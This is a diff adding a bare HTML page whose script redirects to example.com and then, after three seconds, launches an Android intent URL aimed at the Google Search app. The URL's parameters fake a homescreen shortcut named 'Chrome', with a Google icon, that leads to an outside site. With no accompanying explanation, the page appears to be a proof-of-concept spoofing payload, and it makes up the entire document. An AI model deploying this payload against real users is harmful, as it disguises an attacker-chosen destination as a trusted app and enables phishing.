@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+<script>
+  // First, redirect to example.com
+  window.location.href = "https://example.com";
+
+  // After 3 seconds, redirect to the intent URL
+  setTimeout(function() {
+    window.location.href = "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
+  }, 3000);
+</script>
+</html>
